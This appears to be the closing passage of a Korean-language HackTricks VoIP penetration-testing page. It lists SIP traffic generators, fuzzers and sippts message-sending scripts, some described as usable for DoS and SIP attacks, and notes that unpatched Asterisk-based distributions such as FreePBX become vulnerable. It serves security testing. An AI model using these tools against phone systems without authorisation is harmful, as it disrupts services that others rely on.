* [**SIPp**](https://github.com/SIPp/sipp): SIP 트래픽을 분석하고 생성할 수 있습니다. 따라서 DoS에도 사용할 수 있습니다.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP 스위스 아미 나이프. SIP 공격에도 사용할 수 있습니다.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).
* [**sippts**](https://github.com/Pepelux/sippts)의 **`sipsend.py`**: SIPSend를 사용하여 사용자 정의 SIP 메시지를 보내고 응답을 분석할 수 있습니다.
* [**sippts**](https://github.com/Pepelux/sippts)의 **`wssend.py`**: WsSend를 사용하여 웹소켓을 통해 사용자 정의 SIP 메시지를 보내고 응답을 분석할 수 있습니다.

### OS 취약점

Asterisk와 같은 소프트웨어를 설치하는 가장 쉬운 방법은 이미 설치된 **OS 배포판** (예: FreePBX, Elastix, Trixbox)을 다운로드하는 것입니다. 그러나 이러한 배포판은 한 번 작동하면 시스템 관리자가 업데이트를 하지 않을 수 있으며 시간이 지남에 따라 **취약점**이 발견될 수 있습니다.

## 참고 자료

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* 회사를 **HackTricks에서 광고**하거나 **PDF로 HackTricks 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 팔로우하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
